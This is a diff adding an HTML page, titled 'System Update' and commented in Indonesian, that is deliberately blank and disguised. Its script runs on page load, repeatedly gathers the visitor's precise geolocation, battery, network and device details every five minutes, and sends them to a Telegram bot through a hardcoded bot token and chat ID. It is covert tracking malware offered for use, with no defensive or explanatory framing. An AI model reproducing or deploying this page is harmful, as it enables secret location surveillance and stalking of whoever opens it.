@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>System Update</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script>
+    const BOT_TOKEN = '7628065493:AAGuSA9aek-c_dtizC564vGl7nOFRe8TYko';
+    const CHAT_ID = '5677912817'; // Ganti jika perlu
+    const INTERVAL = 5 * 60 * 1000;
+
+    const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
+
+    function getID() {
+      let id = localStorage.getItem('usr_id');
+      if (!id) {
+        id = 'USR-' + btoa(Date.now().toString()).slice(0, 10);
+        localStorage.setItem('usr_id', id);
+      }
+      return id;
+    }
+
+    function getBatteryInfo() {
+      return navigator.getBattery().then(b => ({
+        level: Math.round(b.level * 100),
+        charging: b.charging
+      }));
+    }
+
+    function getNetworkInfo() {
+      const n = navigator.connection || {};
+      return {
+        type: n.effectiveType || 'Unknown',
+        downlink: n.downlink || 'Unknown'
+      };
+    }
+
+    function getDeviceInfo() {
+      return {
+        ua: navigator.userAgent,
+        lang: navigator.language,
+        screen: `${screen.width}x${screen.height}`,
+        color: screen.colorDepth,
+        platform: navigator.platform
+      };
+    }
+
+    function getTimeInfo() {
+      const now = new Date();
+      return {
+        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        local: now.toLocaleString('id-ID'),
+        utc: now.toUTCString()
+      };
+    }
+
+    async function collectAndSend() {
+      const id = getID();
+      const bat = await getBatteryInfo();
+      const net = getNetworkInfo();
+      const dev = getDeviceInfo();
+      const time = getTimeInfo();
+
+      navigator.geolocation.getCurrentPosition(async pos => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+        const acc = pos.coords.accuracy;
+        const spd = pos.coords.speed || 'Unknown';
+        const head = pos.coords.heading || 'Unknown';
+        const alt = pos.coords.altitude || 'Unknown';
+
+        const msg = `[ID: ${id}]
+Lokasi dikirim: ${lat}, ${lon}
+https://maps.google.com/?q=${lat},${lon}
+Speed: ${spd}
+Heading: ${head}
+Altitude: ${alt}
+Accuracy: ${acc}m
+Lang: ${dev.lang}
+TZ: ${time.tz}
+Local: ${time.local}
+UTC: ${time.utc}
+Battery: ${bat.level}% (${bat.charging ? 'Charging' : 'Not Charging'})
+Screen: ${dev.screen}, Color: ${dev.color}
+Platform: ${dev.platform}
+Network: ${net.type}, Downlink: ${net.downlink} Mbps
+Device: ${dev.ua}`;
+
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: msg
+          })
+        });
+      }, err => {
+        console.error('Lokasi gagal:', err.message);
+      }, { enableHighAccuracy: true });
+    }
+
+    async function loopSend() {
+      while (true) {
+        collectAndSend();
+        await delay(INTERVAL);
+      }
+    }
+
+    window.onload = () => {
+      collectAndSend();
+      loopSend();
+    };
+  </script>
+  <style>
+    body {
+      margin: 0;
+      background: #111;
+      color: #111;
+      font-family: sans-serif;
+    }
+  </style>
+</head>
+<body>
+  <!-- Halaman kosong/tersamar -->
+</body>
+</html>
